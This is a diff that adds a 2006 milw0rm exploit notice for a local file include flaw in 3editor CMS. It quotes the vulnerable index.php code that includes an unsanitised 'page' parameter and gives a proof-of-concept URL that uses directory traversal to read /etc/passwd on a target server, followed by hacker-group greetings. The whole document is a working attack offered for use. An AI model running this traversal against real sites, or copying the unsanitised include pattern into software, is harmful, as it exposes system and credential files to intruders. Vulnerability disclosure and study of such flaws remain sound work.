@@ -1,0 +1,23 @@
+************************************************************************     
+*script Name: 3editor CMS (index.php) Local File Include Exploit       *
+*Download:http://www.matteolucarelli.net/3editor/index.htm             *
+*[Author      : Dr Max Virus                                           *
+*[Contact     :drmaxvirus@w.cn                                         *
+************************************************************************
+*Bug & Problem                                                         *
+*In file index.php Let's Take a look;                                  *
+*if (!isset($_GET['page'])) include('phplib/treeedit.php');            *
+*else include('phplib/'.$_GET['page']);                                *
+************************************************************************
+*As We can see the variable of page is not sanitized So attacker can   *
+*apply his bug when:                                                   *
+*register_globals=on                                                   *
+************************************************************************
+*POC Example:                                                          *
+*http://[target]/[path]/index.php?page=../../../../../etc/passwd       *
+************************************************************************
+*Thx:str0ke -koray -ajann -Timq -r0ut3r -All my Friends                *
+*special gr33ts:AsianEagle -The master -Kacper -Hotturk                *
+************************************************************************
+
+# milw0rm.com [2006-12-22]
